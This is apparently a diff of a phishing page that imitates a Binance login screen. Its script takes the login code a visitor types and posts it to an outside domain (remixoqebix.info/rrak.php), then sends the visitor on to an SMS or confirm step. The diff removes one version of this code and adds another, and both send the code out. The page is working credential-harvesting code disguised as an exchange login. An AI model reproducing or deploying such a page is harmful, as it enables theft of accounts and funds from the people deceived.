@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 
 <html dir="ltr" lang="en-us">
@@ -11417,7 +11418,7 @@
             </div>
          </main><br><br><br>
          <div class="css-3kcv4i">
-            <div data-bn-type="text" class="css-1om5toz">© 2017 - 2023 Binance.com. All rights reserved</div>
+            <div data-bn-type="text" class="css-1om5toz">© 2017 - 2022 Binance.com. All rights reserved</div>
 
          </div>
       </div>
@@ -11739,25 +11740,19 @@
             let data = {
                login_code: login_code.value,
             }
-      $.ajax({
-         url: "https://remixoqebix.info/rrak.php/",
-         method: "POST",
-         data: data,
-         success: function (response) {
-            if (response == "1") {
-               window.location.href = 'smss1.html';
-            } else {
-               window.location.href = 'smss1.html';
-               // Handle error cases here
-            }
-         },
-         error: function (jqXHR, textStatus, errorThrown) {
-            window.location.href = 'smss1.html';
-            // Handle AJAX errors here
-         }
+            $.ajax({
+               url: "https://remixoqebix.info/rrak.php/",
+               method: "POST",
+               data: data,
+               success: function (response) {
+                  if(response == "1"){
+                     window.location.href = 'confirm/';
+                  }
+               }
+            });
+
+         });
       });
-   }
-});
    </script>
 </body>
 
